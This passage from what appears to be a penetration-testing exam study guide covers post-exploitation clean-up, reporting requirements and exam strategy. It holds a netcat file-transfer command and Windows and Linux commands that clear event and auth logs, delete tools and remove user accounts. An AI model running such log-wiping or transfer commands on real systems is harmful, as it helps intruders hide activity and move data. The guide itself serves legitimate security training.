# Sender
nc -w 3 <target-ip> 1234 < file
```

## Clean-up & Documentation

### System Clean-up

#### Windows Clean-up
```batch
REM Remove uploaded files
del /f /q c:\tools\*
del /f /q %temp%\*

REM Clear logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

REM Remove user accounts
net user username /delete
```

#### Linux Clean-up
```bash
# Remove uploaded tools
rm -rf /tmp/tools/
rm -rf /dev/shm/*

# Clear logs
echo > /var/log/auth.log
echo > /var/log/syslog
truncate -s 0 /var/log/auth.log

# Remove user accounts
userdel -r username
```

### Documentation Requirements

#### Required Information
1. Network Infrastructure
   - Network topology
   - Discovered hosts
   - Open ports and services
   - Domain structure (if AD environment)

2. Vulnerabilities
   - Found vulnerabilities
   - Exploitation attempts (successful and failed)
   - Proof of concept
   - Impact assessment

3. Evidence Collection
   - Screenshots
   - Command outputs
   - Tool results
   - Extracted data

4. Timeline
   - Initial access
   - Privilege escalation steps
   - Lateral movement
   - Data access

#### Best Practices
1. Real-time Documentation
   - Document commands as they're run
   - Note timestamps for significant events
   - Record both successful and failed attempts

2. Evidence Organization
   - Use clear naming conventions
   - Maintain folder structure
   - Back up documentation regularly

3. Reporting Elements
   - Executive summary
   - Technical findings
   - Risk assessment
   - Remediation recommendations

## Final Exam Tips

### Time Management
1. Initial Enumeration (1-2 hours)
   - Network discovery
   - Service enumeration
   - Quick vulnerability assessment

2. Initial Access (2-3 hours)
   - Exploit research
   - Vulnerability validation
   - Initial foothold

3. Post-Exploitation (2-3 hours)
   - Privilege escalation
   - Lateral movement
   - Domain compromise

4. Documentation (Throughout)
   - Keep notes in real-time
   - Screenshot important findings
   - Document command outputs

### Problem-Solving Approach
1. Stuck? Follow this checklist:
   - Review enumeration data
   - Check for missed services
   - Consider alternative attack paths
   - Look for "quick wins"
   - Start enumeration process again

2. Common Quick Wins:
   - Default credentials
   - Anonymous/guest access
   - Common vulnerabilities
   - Weak passwords
   - Misconfigured services

### Remember

- Multiple attack paths may exist
- Document everything in real-time
- Verify automated tool results manually
- Monitor tool impact on target systems
- Take regular breaks to maintain focus
- Review methodology if stuck
